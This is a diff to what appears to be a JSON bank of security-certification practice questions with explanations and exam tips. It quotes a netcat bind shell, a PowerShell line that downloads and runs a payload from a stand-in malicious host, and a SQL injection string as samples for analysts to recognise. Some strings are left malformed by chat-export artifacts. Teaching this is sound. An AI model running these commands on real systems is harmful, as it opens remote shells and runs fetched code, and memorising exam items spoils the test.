@@ -440,8 +440,7 @@ Piping the output to `grep 198.51.100.25` efficiently filters the results to sho
 {
    "id": 29,
    "question": "A security analyst is reviewing logs and notices the following entry repeated multiple times within a short period:
-Use code with caution.
-JavaScript
+
 [timestamp] Authentication failure for user 'admin' from IP: 198.51.100.42
 [timestamp] Authentication failure for user 'administrator' from IP: 198.51.100.42
 [timestamp] Authentication failure for user 'root' from IP: 198.51.100.42
@@ -575,7 +574,7 @@ The options are reversed in the first choice. Authentication and authorization a
 
  ```bash
  nc -nvlp 4444 -e /bin/bash
-Use code with caution.
+  .
 What is this command MOST likely doing, and why is it a significant security concern?",
 "options":[
 "It is creating a secure shell (SSH) connection to a remote server for legitimate administrative purposes.",
@@ -594,7 +593,7 @@ What is this command MOST likely doing, and why is it a significant security con
 * -e /bin/bash: Execute /bin/bash (the Bash shell) after a connection is established, and connect its input/output to the network connection.
 
 This means the compromised system is *listening* for a connection on port 4444. When an attacker connects to this port, `netcat` will execute `/bin/bash` and connect the shell's input and output to the network connection. This gives the attacker a *remote command shell* on the compromised system, allowing them to execute arbitrary commands and potentially gain full control. This is a *major* security concern.",
-Use code with caution.
+  .
 "examTip": "nc -e (or similar) on a listening port is a strong indicator of a reverse shell."
 },
 {
@@ -678,7 +677,7 @@ By thoroughly validating and sanitizing input, you can prevent a wide range of i
 "question": "A security analyst observes the following PowerShell command being executed on a compromised Windows system:
 
 Invoke-WebRequest -Uri 'http://malicious.example.com/payload.exe' -OutFile 'C:\Users\Public\temp.exe'; Start-Process 'C:\Users\Public\temp.exe'
-Use code with caution.
+  .
 Powershell
 What is this command doing, and why is it a significant security risk?",
 "options":[
@@ -736,9 +735,9 @@ These techniques, often combined with advanced Endpoint Detection and Response (
 "question": "A company's web application allows users to input search terms. An attacker enters the following search term:
 
 ' OR 1=1 --
-Use code with caution.
+  .
 What type of attack is MOST likely being attempted, and what is the attacker's goal?",
-Use code with caution.
+  .
 "options":[
 "Cross-site scripting (XSS); to inject malicious scripts into the website.",
 "SQL injection; to bypass authentication or retrieve all data from a database table.",
@@ -753,7 +752,7 @@ Use code with caution.
 * --: Comment out the rest of the original SQL query.
 
 If the application is vulnerable, this injected code will modify the SQL query, potentially causing it to return *all rows* from the table (bypassing any intended filtering) or even allowing the attacker to bypass authentication if this query is part of a login process.",
-Use code with caution.
+  .
 "examTip": "SQL injection attacks often use ' OR 1=1 -- to create a universally true condition and bypass query logic."
 },
 {
